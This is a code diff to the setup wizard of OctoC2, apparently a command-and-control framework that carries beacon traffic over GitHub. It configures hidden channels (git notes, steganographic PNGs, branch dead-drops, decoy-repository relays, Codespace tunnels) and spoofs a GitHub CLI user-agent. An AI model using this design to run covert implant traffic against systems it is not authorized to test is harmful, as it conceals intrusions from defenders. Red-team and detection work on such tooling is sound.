@@ -5,26 +5,43 @@ import { generateOperatorKeyPair, bytesToBase64 } from "../../lib/crypto.ts";
 import { checkRepo } from "./validate.ts";
 import { findProjectRoot } from "../service.ts";
 import {
-  wizardIntro, wizardOutro, sectionHeader, withSpinner,
+  ed25519KeyId,
+  encodeBase64Url,
+  generateEd25519KeyPair,
+} from "@octoc2/shared";
+import { randomBytes, randomUUID } from "node:crypto";
+import { chmod, mkdir, writeFile } from "node:fs/promises";
+import { dirname, resolve } from "node:path";
+import {
+  sectionHeader, withSpinner,
   promptPassword, promptText, promptSelect, promptConfirm, maskToken,
 } from "./prompts.ts";
 
 const DIM   = "\x1b[2m";
 const BOLD  = "\x1b[1m";
 const RESET = "\x1b[0m";
-const GREEN = "\x1b[32m";
-const RED   = "\x1b[31m";
-const YELLOW = "\x1b[33m";
 
 export interface SetupState {
-  token: string;
+  operatorGitHubToken: string;
+  serverGitHubToken: string;
   owner: string;
   repo: string;
   operatorSecret: string;
   operatorPublicKey: string;
-  authMode: "pat" | "app";
-  appId?: number;
-  installationId?: number;
+  operatorApiToken: string;
+  beaconControllerToken: string;
+  beaconId: string;
+  appId: number;
+  installationId: number;
+  appPrivateKeyFile: string;
+  recoveryRepoOwner: string;
+  recoveryRepoName: string;
+  recoveryRepoRef: string;
+  recoveryWriteToken: string;
+  recoverySigningSecret?: string;
+  recoverySigningSecretFile?: string;
+  recoverySigningPublicKey: string;
+  recoverySigningKeyId: string;
   tentaclePriority?: string;
   proxyRepos?: string;
   codespaceName?: string;
@@ -33,15 +50,17 @@ export interface SetupState {
   httpUrl?: string;
   sleepSeconds?: number;
   jitter?: number;
-  cleanupDays?: number;
   logLevel?: string;
   envPath?: string;
+  enrollmentDir?: string;
+  binaryPath?: string;
 }
 
 // ── Phase 1: Credentials ─────────────────────────────────────────────────────
 
 export async function phaseCredentials(): Promise<{
-  token: string;
+  operatorGitHubToken: string;
+  serverGitHubToken: string;
   owner: string;
   repo: string;
 }> {
@@ -49,11 +68,12 @@ export async function phaseCredentials(): Promise<{
 
   p.note(
     `Your C2 repo is a private GitHub repository where all\n` +
-    `beacon traffic flows (issues, branches, gists, etc.).\n\n` +
-    `You need a PAT from an account that can access this repo.\n` +
-    `Create one at: ${BOLD}github.com/settings/tokens/new${RESET}\n` +
-    `Required scope: ${BOLD}repo${RESET}  Optional: ${DIM}gist, codespace${RESET}`,
-    "What you'll need"
+    `GitHub-backed traffic flows. Credentials have separate roles:\n\n` +
+    `${BOLD}Operator token${RESET} — provisioning and explicit direct-GitHub mode\n` +
+    `${BOLD}Server token${RESET}   — controller polling and publishing\n\n` +
+    `Neither credential is embedded in a beacon. Use distinct,\n` +
+    `fine-grained tokens limited to the required repositories.`,
+    "Credential boundaries"
   );
 
   const owner = await promptText({
@@ -68,24 +88,38 @@ export async function phaseCredentials(): Promise<{
     validate: (v) => (!v.trim() ? "Required" : undefined),
   });
 
-  const token = await promptPassword({
-    message: `PAT with access to ${owner}/${repo}`,
+  const operatorGitHubToken = await promptPassword({
+    message: `Operator GitHub token for ${owner}/${repo}`,
     validate: (v) => {
-      if (!v.trim()) return "Token is required";
-      if (!v.startsWith("ghp_") && !v.startsWith("github_pat_"))
-        return "Expected a GitHub PAT (ghp_… or github_pat_…)";
+      if (!v.trim()) return "Operator token is required";
     },
   });
 
-  p.log.success(`Token: ${maskToken(token)}`);
+  const serverGitHubToken = await promptPassword({
+    message: `Server GitHub token for ${owner}/${repo}`,
+    validate: (v) => {
+      if (!v.trim()) return "Server token is required";
+      if (v.trim() === operatorGitHubToken.trim()) {
+        return "Server and operator GitHub tokens must be distinct";
+      }
+    },
+  });
 
-  return { token: token.trim(), owner: owner.trim(), repo: repo.trim() };
+  p.log.success(`Operator token: ${maskToken(operatorGitHubToken)}`);
+  p.log.success(`Server token:   ${maskToken(serverGitHubToken)}`);
+
+  return {
+    operatorGitHubToken: operatorGitHubToken.trim(),
+    serverGitHubToken: serverGitHubToken.trim(),
+    owner: owner.trim(),
+    repo: repo.trim(),
+  };
 }
 
 // ── Phase 2: Validate ────────────────────────────────────────────────────────
 
 export async function phaseValidate(
-  token: string,
+  operatorGitHubToken: string,
   owner: string,
   repo: string,
 ): Promise<void> {
@@ -93,7 +127,7 @@ export async function phaseValidate(
 
   const result = await withSpinner(
     `Checking ${owner}/${repo}`,
-    () => checkRepo(token, owner, repo),
+    () => checkRepo(operatorGitHubToken, owner, repo),
   );
 
   if (result.error) {
@@ -104,9 +138,10 @@ export async function phaseValidate(
   }
 
   // Scope check
-  const hasRepo = result.scopes.includes("repo");
-  if (!hasRepo) {
-    p.log.warn("PAT is missing 'repo' scope — most tentacles will fail");
+  if (result.scopes.length === 0) {
+    p.log.info("Fine-grained token permissions are not exposed in the OAuth scope header");
+  } else if (!result.scopes.includes("repo")) {
+    p.log.warn("Classic token is missing the 'repo' scope");
   } else {
     p.log.success(`Scopes: ${result.scopes.join(", ")}`);
   }
@@ -131,7 +166,7 @@ export async function phaseValidate(
 // ── Phase 3: Keygen ──────────────────────────────────────────────────────────
 
 export async function phaseKeygen(
-  token: string,
+  operatorGitHubToken: string,
   owner: string,
   repo: string,
 ): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
@@ -145,15 +180,23 @@ export async function phaseKeygen(
   );
 
   const existingSecret = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
-  if (existingSecret) {
+  const existingPublic = process.env["MONITORING_PUBKEY"]?.trim();
+  if (existingSecret && existingPublic) {
     const reuse = await promptConfirm({
-      message: "Existing OCTOC2_OPERATOR_SECRET found in env. Reuse it?",
+      message: "Existing operator X25519 keypair found in env. Reuse it?",
       initialValue: true,
     });
     if (reuse) {
       p.log.success("Reusing existing keypair");
-      return { operatorSecret: existingSecret, operatorPublicKey: "(existing)" };
+      return {
+        operatorSecret: existingSecret,
+        operatorPublicKey: existingPublic,
+      };
     }
+  } else if (existingSecret) {
+    p.log.warn(
+      "OCTOC2_OPERATOR_SECRET exists without MONITORING_PUBKEY; generating a complete replacement keypair",
+    );
   }
 
   const kp = await withSpinner("Generating X25519 keypair", async () => {
@@ -178,7 +221,7 @@ export async function phaseKeygen(
   if (pushVar) {
     await withSpinner("Setting MONITORING_PUBKEY variable", async () => {
       const octokit = new Octokit({
-        auth: token,
+        auth: operatorGitHubToken,
         headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
       });
       try {
@@ -198,57 +241,131 @@ export async function phaseKeygen(
   return { operatorSecret: kp.secret, operatorPublicKey: kp.public };
 }
 
-// ── Phase 4: Auth Mode ───────────────────────────────────────────────────────
+// ── Phase 4: Server-held App + signed recovery ───────────────────────────────
 
-export async function phaseAuthMode(): Promise<{
-  authMode: "pat" | "app";
-  appId?: number;
-  installationId?: number;
-}> {
-  sectionHeader("4/10  Beacon Authentication");
+export interface ServerRecoveryConfig {
+  operatorApiToken: string;
+  beaconControllerToken: string;
+  beaconId: string;
+  appId: number;
+  installationId: number;
+  appPrivateKeyFile: string;
+  recoveryRepoOwner: string;
+  recoveryRepoName: string;
+  recoveryRepoRef: string;
+  recoveryWriteToken: string;
+  recoverySigningSecret: string;
+  recoverySigningPublicKey: string;
+  recoverySigningKeyId: string;
+}
 
-  const mode = await promptSelect<"pat" | "app">({
-    message: "How should the beacon authenticate to GitHub?",
-    options: [
-      { value: "pat", label: "PAT only", hint: "your PAT is baked into the binary" },
-      { value: "app", label: "GitHub App", hint: "rotating 1hr tokens, private key delivered via dead-drop" },
-    ],
-  });
+export function generateControllerCredential(): string {
+  return randomBytes(32).toString("base64url");
+}
 
-  if (mode === "pat") return { authMode: "pat" };
+export async function phaseServerRecovery(
+  owner: string,
+  operatorGitHubToken: string,
+  serverGitHubToken: string,
+): Promise<ServerRecoveryConfig> {
+  sectionHeader("4/10  Server-held App & Signed Recovery");
 
   p.note(
-    `Create a GitHub App at: ${BOLD}github.com/settings/apps/new${RESET}\n\n` +
-    `Permissions needed:\n` +
-    `  Contents     Read & Write\n` +
-    `  Issues       Read & Write\n` +
-    `  Variables    Read & Write\n` +
-    `  Actions      Read & Write\n\n` +
-    `After creating, install it on your C2 repo.\n` +
-    `The App ID is on the app settings page.\n` +
-    `The Installation ID is in the URL after installing.`,
-    "GitHub App setup"
+    `The GitHub App private key stays on the controller. The server\n` +
+    `mints short-lived, repository-bound installation-token leases\n` +
+    `and publishes them as signed, sealed records at a deterministic\n` +
+    `path in a dedicated public recovery repository.\n\n` +
+    `The beacon receives only public recovery trust and its own\n` +
+    `provisioned identity; no App key or shared GitHub token is baked.`,
+    "Recovery trust boundary"
   );
 
   const appIdStr = await promptText({
-    message: "App ID",
+    message: "GitHub App ID",
     placeholder: "123456",
-    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
+    validate: (v) => (
+      Number.isSafeInteger(Number(v)) && Number(v) > 0
+        ? undefined
+        : "Must be a positive integer"
+    ),
   });
 
   const installIdStr = await promptText({
-    message: "Installation ID",
+    message: "Installation ID for the C2 repository",
     placeholder: "987654",
-    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
+    validate: (v) => (
+      Number.isSafeInteger(Number(v)) && Number(v) > 0
+        ? undefined
+        : "Must be a positive integer"
+    ),
   });
 
-  p.log.info(`${DIM}Private key is never baked — deliver after deployment with:${RESET}`);
-  p.log.info(`${DIM}octoctl drop create --beacon <id> --app-key-file <pem>${RESET}`);
+  const appPrivateKeyFile = await promptText({
+    message: "Server-side App private key PEM path",
+    placeholder: "~/.config/octoc2/github-app.pem",
+    validate: (v) => (!v.trim() ? "Path is required" : undefined),
+  });
+
+  const recoveryRepoOwner = await promptText({
+    message: "Public recovery repo owner",
+    initialValue: owner,
+    placeholder: owner,
+    validate: (v) => (!v.trim() ? "Required" : undefined),
+  });
+
+  const recoveryRepoName = await promptText({
+    message: "Public recovery repo name",
+    placeholder: "octoc2-recovery",
+    validate: (v) => (!v.trim() ? "Required" : undefined),
+  });
+
+  const recoveryRepoRef = await promptText({
+    message: "Recovery repo ref",
+    initialValue: "main",
+    placeholder: "main",
+    validate: (v) => (!v.trim() ? "Required" : undefined),
+  });
+
+  const recoveryWriteToken = await promptPassword({
+    message: `Dedicated write token for ${recoveryRepoOwner}/${recoveryRepoName}`,
+    validate: (v) => {
+      const value = v.trim();
+      if (!value) return "Recovery write token is required";
+      if (value === operatorGitHubToken || value === serverGitHubToken) {
+        return "Recovery writer must use a distinct credential";
+      }
+    },
+  });
+
+  const signing = await withSpinner(
+    "Generating recovery Ed25519 signing key",
+    async () => {
+      const keyPair = await generateEd25519KeyPair();
+      return {
+        secret: encodeBase64Url(keyPair.secretKey),
+        public: encodeBase64Url(keyPair.publicKey),
+        keyId: await ed25519KeyId(keyPair.publicKey),
+      };
+    },
+  );
 
   return {
-    authMode: "app",
-    appId: parseInt(appIdStr, 10),
-    installationId: parseInt(installIdStr, 10),
+    operatorApiToken: generateControllerCredential(),
+    beaconControllerToken: generateControllerCredential(),
+    beaconId: randomUUID(),
+    appId: Number(appIdStr),
+    installationId: Number(installIdStr),
+    appPrivateKeyFile: appPrivateKeyFile.trim().replace(
+      /^~/,
+      process.env.HOME ?? "",
+    ),
+    recoveryRepoOwner: recoveryRepoOwner.trim(),
+    recoveryRepoName: recoveryRepoName.trim(),
+    recoveryRepoRef: recoveryRepoRef.trim(),
+    recoveryWriteToken: recoveryWriteToken.trim(),
+    recoverySigningSecret: signing.secret,
+    recoverySigningPublicKey: signing.public,
+    recoverySigningKeyId: signing.keyId,
   };
 }
 
@@ -260,7 +377,7 @@ export async function phaseTentacles(): Promise<string | undefined> {
   const mode = await promptSelect<"auto" | "custom">({
     message: "Channel selection strategy",
     options: [
-      { value: "auto", label: "Auto-detect", hint: "stealth-first ordering, automatic fallback" },
+      { value: "auto", label: "Recommended policy", hint: "App-compatible channels with automatic fallback" },
       { value: "custom", label: "Custom", hint: "pick channels and set priority order" },
     ],
   });
@@ -272,9 +389,9 @@ export async function phaseTentacles(): Promise<string | undefined> {
     options: [
       { value: "notes",    label: "Notes",          hint: "refs/notes — invisible to GitHub UI" },
       { value: "stego",    label: "Steganography",   hint: "LSB-encoded PNG in branches" },
-      { value: "gist",     label: "Gist",            hint: "secret gists — not visible in repo" },
       { value: "branch",   label: "Branch",          hint: "file dead-drops on infra-sync branches" },
-      { value: "actions",  label: "Actions",         hint: "Variables API — only inside GH Actions" },
+      { value: "actions",  label: "Actions",         hint: "Variables API plus repository dispatch" },
+      { value: "pages",    label: "Pages",           hint: "deployment-status transport" },
       { value: "secrets",  label: "Secrets",         hint: "Variables API — out-of-band config" },
       { value: "proxy",    label: "OctoProxy",       hint: "relay through decoy repos" },
       { value: "issues",   label: "Issues",          hint: "encrypted comments — always available" },
@@ -299,11 +416,12 @@ export interface AdvancedConfig {
   httpUrl?: string;
   sleepSeconds?: number;
   jitter?: number;
-  cleanupDays?: number;
   logLevel?: string;
 }
 
-export async function phaseAdvanced(): Promise<AdvancedConfig> {
+export async function phaseAdvanced(
+  defaultInstallationId: number,
+): Promise<AdvancedConfig> {
   sectionHeader("6/10  Advanced Configuration");
 
   const configure = await promptConfirm({
@@ -324,52 +442,53 @@ export async function phaseAdvanced(): Promise<AdvancedConfig> {
   if (useProxy) {
     p.note(
       `Proxy repos relay beacon traffic through decoy repositories.\n` +
-      `Each entry needs: owner, repo name, and a PAT for that repo.\n\n` +
-      `Format: JSON array of objects with owner, repo, token fields.`,
+      `Each entry is bound to a preconfigured GitHub App installation.\n` +
+      `The server mints scoped leases; no proxy token is stored in the\n` +
+      `controller environment or delivered as static beacon config.`,
       "OctoProxy"
     );
 
-    const proxyEntries: Array<{ owner: string; repo: string; token: string; innerKind: string }> = [];
-    let addMore = true;
+    const proxyOwner = await promptText({
+      message: "Proxy repo owner",
+      placeholder: "decoy-org",
+      validate: (v) => (!v.trim() ? "Required" : undefined),
+    });
 
-    while (addMore) {
-      const proxyOwner = await promptText({
-        message: "Proxy repo owner",
-        placeholder: "decoy-org",
-        validate: (v) => (!v.trim() ? "Required" : undefined),
-      });
+    const proxyRepo = await promptText({
+      message: "Proxy repo name",
+      placeholder: "infra-sync",
+      validate: (v) => (!v.trim() ? "Required" : undefined),
+    });
 
-      const proxyRepo = await promptText({
-        message: "Proxy repo name",
-        placeholder: "infra-sync",
-        validate: (v) => (!v.trim() ? "Required" : undefined),
-      });
+    const proxyInstallationId = await promptText({
+      message: `App installation ID for ${proxyOwner}/${proxyRepo}`,
+      initialValue: String(defaultInstallationId),
+      placeholder: String(defaultInstallationId),
+      validate: (v) => (
+        Number.isSafeInteger(Number(v)) && Number(v) > 0
+          ? undefined
+          : "Must be a positive integer"
+      ),
+    });
 
-      const proxyToken = await promptPassword({
-        message: `PAT for ${proxyOwner}/${proxyRepo}`,
-        validate: (v) => (!v.trim() ? "Required" : undefined),
-      });
+    const decoyIssue = await promptText({
+      message: `Provisioned issue number in ${proxyOwner}/${proxyRepo}`,
+      placeholder: "7",
+      validate: (v) => (
+        Number.isSafeInteger(Number(v)) && Number(v) > 0
+          ? undefined
+          : "Must be a positive integer"
+      ),
+    });
 
-      const innerKind = await promptSelect<"issues" | "notes">({
-        message: "Inner channel for this proxy",
-        options: [
-          { value: "issues", label: "Issues", hint: "default" },
-          { value: "notes", label: "Notes", hint: "stealthier" },
-        ],
-      });
-
-      proxyEntries.push({
-        owner: proxyOwner.trim(),
-        repo: proxyRepo.trim(),
-        token: proxyToken.trim(),
-        innerKind,
-      });
-
-      addMore = await promptConfirm({ message: "Add another proxy repo?", initialValue: false });
-    }
-
-    config.proxyRepos = JSON.stringify(proxyEntries);
-    p.log.success(`${proxyEntries.length} proxy repo(s) configured`);
+    config.proxyRepos = JSON.stringify([{
+      owner: proxyOwner.trim(),
+      repo: proxyRepo.trim(),
+      installationId: Number(proxyInstallationId),
+      innerKind: "issues",
+      decoyIssue: Number(decoyIssue),
+    }]);
+    p.log.success("Proxy repo configured");
   }
 
   // ── Codespace gRPC ───────────────────────────────────────────────────────
@@ -382,7 +501,10 @@ export async function phaseAdvanced(): Promise<AdvancedConfig> {
     p.note(
       `The gRPC channel tunnels through a GitHub Codespace via SSH.\n` +
       `The beacon connects to the Codespace and forwards gRPC traffic\n` +
-      `to the C2 server running inside it.`,
+      `to the C2 server running inside it.\n\n` +
+      `Provide SVC_CODESPACES_GITHUB_TOKEN as a protected runtime secret on\n` +
+      `the target. It must be an explicit user-scoped credential for the\n` +
+      `Codespaces API/SSH gateway; App installation leases are not accepted.`,
       "Codespace gRPC"
     );
 
@@ -437,7 +559,7 @@ export async function phaseAdvanced(): Promise<AdvancedConfig> {
     config.jitter = parseFloat(jitterStr);
   }
 
-  // ── Cleanup + logging ────────────────────────────────────────────────────
+  // ── Controller logging ───────────────────────────────────────────────────
   const logLevel = await promptSelect<"info" | "warn" | "error" | "debug">({
     message: "Log level",
     options: [
@@ -449,97 +571,254 @@ export async function phaseAdvanced(): Promise<AdvancedConfig> {
   });
   if (logLevel !== "info") config.logLevel = logLevel;
 
-  const cleanupStr = await promptText({
-    message: "Auto-cleanup result comments after N days (blank = never)",
-    placeholder: "leave blank to skip",
-  });
-  if (cleanupStr.trim()) {
-    const n = parseInt(cleanupStr, 10);
-    if (!isNaN(n) && n >= 0) config.cleanupDays = n;
-  }
-
   return config;
 }
 
 // ── Phase 7: Write .env ──────────────────────────────────────────────────────
 
 export interface EnvFileInput {
-  token: string;
+  operatorGitHubToken: string;
+  serverGitHubToken: string;
   owner: string;
   repo: string;
   operatorSecret: string;
   operatorPublicKey: string;
-  appId?: number;
-  installationId?: number;
+  operatorApiToken: string;
+  beaconControllerToken: string;
+  beaconId: string;
+  enrollmentDir: string;
+  appId: number;
+  installationId: number;
+  appPrivateKeyFile: string;
+  recoveryRepoOwner: string;
+  recoveryRepoName: string;
+  recoveryRepoRef: string;
+  recoveryWriteToken: string;
+  recoverySigningSecretFile: string;
+  recoverySigningPublicKey: string;
+  recoverySigningKeyId: string;
   tentaclePriority?: string;
   proxyRepos?: string;
-  codespaceName?: string;
-  githubUser?: string;
   grpcPort?: string;
   httpUrl?: string;
   sleepSeconds?: number;
   jitter?: number;
-  cleanupDays?: number;
   logLevel?: string;
 }
 
+export interface SetupProxyPolicy {
+  owner: string;
+  repo: string;
+  installationId: number;
+  innerKind: "issues";
+  decoyIssue: number;
+}
+
+const DEFAULT_RECOVERY_PRIORITY = [
+  "notes",
+  "stego",
+  "branch",
+  "actions",
+  "pages",
+  "secrets",
+  "issues",
+] as const;
+
+const RECOVERY_CHANNELS = new Set([
+  ...DEFAULT_RECOVERY_PRIORITY,
+  "proxy",
+  "http",
+  "codespaces",
+]);
+
+export function parseSetupProxyPolicies(
+  raw: string | undefined,
+): SetupProxyPolicy[] {
+  if (!raw) return [];
+  const parsed = JSON.parse(raw) as unknown;
+  if (!Array.isArray(parsed)) {
+    throw new Error("Proxy policy must be a JSON array");
+  }
+  if (parsed.length > 1) {
+    throw new Error("Proxy policy supports at most one route per beacon");
+  }
+  return parsed.map((entry, index) => {
+    if (
+      typeof entry !== "object" ||
+      entry === null ||
+      Array.isArray(entry)
+    ) {
+      throw new Error(`Proxy policy ${index} must be an object`);
+    }
+    const value = entry as Record<string, unknown>;
+    if (
+      typeof value["owner"] !== "string" ||
+      typeof value["repo"] !== "string" ||
+      !Number.isSafeInteger(value["installationId"]) ||
+      (value["installationId"] as number) <= 0 ||
+      value["innerKind"] !== "issues" ||
+      !Number.isSafeInteger(value["decoyIssue"]) ||
+      (value["decoyIssue"] as number) <= 0
+    ) {
+      throw new Error(`Proxy policy ${index} is invalid`);
+    }
+    return {
+      owner: value["owner"],
+      repo: value["repo"],
+      installationId: value["installationId"] as number,
+      innerKind: "issues" as const,
+      decoyIssue: value["decoyIssue"] as number,
+    };
+  });
+}
+
+export function normalizeRecoveryTentaclePriority(
+  raw: string | undefined,
+  hasProxyRepos: boolean,
+): string[] {
+  const requested = raw
+    ? raw.split(",").map((value) => value.trim()).filter(Boolean)
+    : [...DEFAULT_RECOVERY_PRIORITY];
+  const unsupported = requested.filter(
+    (value) => !RECOVERY_CHANNELS.has(value),
+  );
+  if (unsupported.length > 0) {
+    throw new Error(
+      `Recovery policy contains unsupported channel(s): ${unsupported.join(", ")}`,
+    );
+  }
+  const unique = [...new Set(requested)].filter(
+    (value) => value !== "proxy",
+  );
+  if (hasProxyRepos) unique.push("proxy");
+  if (unique.length === 0) {
+    throw new Error("Recovery policy must contain at least one channel");
+  }
+  return unique;
+}
+
 export function generateEnvFile(input: EnvFileInput): string {
+  const credentials = [
+    input.operatorGitHubToken,
+    input.serverGitHubToken,
+    input.operatorApiToken,
+    input.beaconControllerToken,
+    input.recoveryWriteToken,
+  ];
+  if (new Set(credentials).size !== credentials.length) {
+    throw new Error("Operator, server, recovery, and controller credentials must be distinct");
+  }
+
+  const proxyPolicies = parseSetupProxyPolicies(input.proxyRepos);
+  const tentaclePriority = normalizeRecoveryTentaclePriority(
+    input.tentaclePriority,
+    proxyPolicies.length > 0,
+  );
+  const primaryPermissions = {
+    metadata: "read",
+    issues: "write",
+    contents: "write",
+    actions: "write",
+    deployments: "write",
+    variables: "write",
+  } as const;
+  const appPolicies = {
+    [input.beaconId]: {
+      installationId: input.installationId,
+      repository: { owner: input.owner, repo: input.repo },
+      permissions: primaryPermissions,
+      ...(proxyPolicies.length > 0 && {
+        proxyRepositories: proxyPolicies.map((proxy) => ({
+          installationId: proxy.installationId,
+          repository: { owner: proxy.owner, repo: proxy.repo },
+          permissions: {
+            metadata: "read",
+            issues: "write",
+            variables: "read",
+          },
+        })),
+      }),
+    },
+  };
+  const serverUrl = input.httpUrl ?? "https://127.0.0.1:8080";
+  const recoveryPolicies = {
+    [input.beaconId]: {
+      serverUrl,
+      controllerToken: input.beaconControllerToken,
+      monitoringPublicKey: input.operatorPublicKey,
+      tentaclePriority,
+      relayConsortium: [],
+      proxyRepos: proxyPolicies.map(({
+        owner,
+        repo,
+        innerKind,
+        decoyIssue,
+      }) => ({
+        owner,
+        repo,
+        innerKind,
+        decoyIssue,
+      })),
+      sleepSeconds: input.sleepSeconds ?? 60,
+      jitter: input.jitter ?? 0.3,
+    },
+  };
+
   const lines: string[] = [
     `# OctoC2 environment — generated by octoctl setup`,
     `# ${new Date().toISOString().slice(0, 10)}`,
     ``,
-    `# ── C2 repo ─────────────────────────────────────────────────────────────────`,
-    `OCTOC2_GITHUB_TOKEN=${input.token}`,
+    `# Controller/operator credentials. This file is not a beacon environment.`,
+    `OCTOC2_OPERATOR_GITHUB_TOKEN=${input.operatorGitHubToken}`,
+    `OCTOC2_SERVER_GITHUB_TOKEN=${input.serverGitHubToken}`,
+    `OCTOC2_OPERATOR_API_TOKEN=${input.operatorApiToken}`,
+    `OCTOC2_BEACON_API_TOKENS='${JSON.stringify({
+      [input.beaconId]: input.beaconControllerToken,
+    })}'`,
+    ``,
+    `# C2 repository and pre-enrolled beacon identity`,
     `OCTOC2_REPO_OWNER=${input.owner}`,
     `OCTOC2_REPO_NAME=${input.repo}`,
+    `OCTOC2_ENROLLMENT_DIR=${input.enrollmentDir}`,
     ``,
-    `# ── Operator keypair ────────────────────────────────────────────────────────`,
+    `# Operator encryption identity`,
     `OCTOC2_OPERATOR_SECRET=${input.operatorSecret}`,
-    `# MONITORING_PUBKEY=${input.operatorPublicKey}`,
+    `MONITORING_PUBKEY=${input.operatorPublicKey}`,
+    ``,
+    `# Direct listeners remain disabled and loopback-bound until explicitly enabled.`,
+    `OCTOC2_SERVER_URL=${serverUrl}`,
+    `OCTOC2_HTTP_ENABLED=false`,
+    `OCTOC2_HTTP_HOST=127.0.0.1`,
+    `OCTOC2_HTTP_PORT=8080`,
+    `OCTOC2_HTTP_SERVER_CERT=`,
+    `OCTOC2_HTTP_SERVER_KEY=`,
+    `OCTOC2_HTTP_CA_CERT=`,
+    `OCTOC2_GRPC_ENABLED=false`,
+    `OCTOC2_GRPC_HOST=127.0.0.1`,
+    `OCTOC2_GRPC_PORT=${input.grpcPort ?? "50051"}`,
+    `OCTOC2_GRPC_CA_CERT=`,
+    `OCTOC2_GRPC_SERVER_CERT=`,
+    `OCTOC2_GRPC_SERVER_KEY=`,
+    `OCTOC2_GRPC_CLIENT_CERT_FINGERPRINTS=`,
+    ``,
+    `# Server-held GitHub App and deterministic signed recovery`,
+    `OCTOC2_RECOVERY_PUBLISH_ENABLED=true`,
+    `OCTOC2_GITHUB_APP_ID=${input.appId}`,
+    `OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE=${input.appPrivateKeyFile}`,
+    `OCTOC2_GITHUB_APP_POLICIES='${JSON.stringify(appPolicies)}'`,
+    `OCTOC2_RECOVERY_REPO_OWNER=${input.recoveryRepoOwner}`,
+    `OCTOC2_RECOVERY_REPO_NAME=${input.recoveryRepoName}`,
+    `OCTOC2_RECOVERY_REPO_REF=${input.recoveryRepoRef}`,
+    `OCTOC2_RECOVERY_WRITE_TOKEN=${input.recoveryWriteToken}`,
+    `OCTOC2_RECOVERY_SIGNING_SECRET_FILE=${input.recoverySigningSecretFile}`,
+    `OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY=${input.recoverySigningPublicKey}`,
+    `OCTOC2_RECOVERY_SIGNING_KEY_ID=${input.recoverySigningKeyId}`,
+    `OCTOC2_RECOVERY_POLICIES='${JSON.stringify(recoveryPolicies)}'`,
+    `OCTOC2_RECOVERY_PUBLISH_INTERVAL_MS=1800000`,
   ];
 
-  if (input.appId !== undefined || input.installationId !== undefined) {
-    lines.push(``);
-    lines.push(`# ── GitHub App ──────────────────────────────────────────────────────────────`);
-    if (input.appId !== undefined) lines.push(`SVC_APP_ID=${input.appId}`);
-    if (input.installationId !== undefined) lines.push(`SVC_INSTALLATION_ID=${input.installationId}`);
-    lines.push(`# Private key delivered via dead-drop (never baked)`);
-  }
-
-  if (input.tentaclePriority) {
-    lines.push(``);
-    lines.push(`# ── Tentacle priority ───────────────────────────────────────────────────────`);
-    lines.push(`SVC_TENTACLE_PRIORITY=${input.tentaclePriority}`);
-  }
-
-  if (input.proxyRepos) {
-    lines.push(``);
-    lines.push(`# ── Proxy relay repos ───────────────────────────────────────────────────────`);
-    lines.push(`SVC_PROXY_REPOS='${input.proxyRepos}'`);
-  }
-
-  if (input.codespaceName || input.githubUser) {
-    lines.push(``);
-    lines.push(`# ── Codespace gRPC channel ──────────────────────────────────────────────────`);
-    if (input.codespaceName) lines.push(`SVC_GRPC_CODESPACE_NAME=${input.codespaceName}`);
-    if (input.githubUser) lines.push(`SVC_GITHUB_USER=${input.githubUser}`);
-    if (input.grpcPort) lines.push(`SVC_GRPC_PORT=${input.grpcPort}`);
-  }
-
-  if (input.httpUrl) {
-    lines.push(``);
-    lines.push(`# ── HTTP/WebSocket channel ──────────────────────────────────────────────────`);
-    lines.push(`SVC_HTTP_URL=${input.httpUrl}`);
-  }
-
-  const hasAdvanced = input.sleepSeconds || input.jitter || input.cleanupDays || input.logLevel;
-  if (hasAdvanced) {
-    lines.push(``);
-    lines.push(`# ── Beacon tuning ───────────────────────────────────────────────────────────`);
-    if (input.sleepSeconds) lines.push(`SVC_SLEEP=${input.sleepSeconds}`);
-    if (input.jitter) lines.push(`SVC_JITTER=${input.jitter}`);
-    if (input.cleanupDays !== undefined) lines.push(`SVC_CLEANUP_DAYS=${input.cleanupDays}`);
-    if (input.logLevel) lines.push(`OCTOC2_LOG_LEVEL=${input.logLevel}`);
+  if (input.logLevel) {
+    lines.push(`OCTOC2_LOG_LEVEL=${input.logLevel}`);
   }
 
   lines.push(``);
@@ -549,16 +828,14 @@ export function generateEnvFile(input: EnvFileInput): string {
 export async function phaseWriteEnv(state: SetupState): Promise<string> {
   sectionHeader("7/10  Environment File");
 
-  const { resolve } = await import("node:path");
-  const defaultPath = resolve(findProjectRoot(), ".env");
+  const defaultPath =
+    state.envPath ?? resolve(findProjectRoot(), ".env");
 
   const envPath = await promptText({
     message: "Write .env to",
     initialValue: defaultPath,
     placeholder: defaultPath,
   });
-
-  const content = generateEnvFile(state);
 
   const { existsSync } = await import("node:fs");
   if (existsSync(envPath)) {
@@ -572,24 +849,67 @@ export async function phaseWriteEnv(state: SetupState): Promise<string> {
     }
   }
 
-  await Bun.write(envPath, content);
-  p.log.success(`Saved to ${envPath}`);
+  const recoverySigningSecretFile =
+    state.recoverySigningSecretFile ??
+    resolve(dirname(envPath), "octoc2-recovery-signing.key");
+  if (
+    !state.recoverySigningSecret &&
+    !existsSync(recoverySigningSecretFile)
+  ) {
+    throw new Error(
+      "Recovery signing secret is unavailable; generate or import a complete modern setup",
+    );
+  }
+  const content = generateEnvFile({
+    ...state,
+    enrollmentDir: state.enrollmentDir ?? findProjectRoot(),
+    recoverySigningSecretFile,
+  });
+
+  await mkdir(dirname(envPath), { recursive: true });
+  await writeFile(envPath, content, "utf8");
+  if (state.recoverySigningSecret) {
+    await writeFile(
+      recoverySigningSecretFile,
+      `${state.recoverySigningSecret}\n`,
+      "utf8",
+    );
+    try {
+      await chmod(recoverySigningSecretFile, 0o600);
+    } catch {
+      p.log.warn(
+        `Could not restrict permissions on ${recoverySigningSecretFile}; secure it manually`,
+      );
+    }
+  }
+  state.recoverySigningSecretFile = recoverySigningSecretFile;
+  p.log.success(`Controller environment: ${envPath}`);
+  p.log.success(`Recovery signing secret: ${recoverySigningSecretFile}`);
   return envPath;
 }
 
-// ── Phase 7: Build Beacon ────────────────────────────────────────────────────
+// ── Phase 8: Build Beacon ────────────────────────────────────────────────────
 
-export async function phaseBuildBeacon(state: SetupState): Promise<string | undefined> {
+export interface BeaconBuildResult {
+  beaconId: string;
+  enrollmentDir: string;
+  binaryPath?: string;
+}
+
+export async function phaseBuildBeacon(
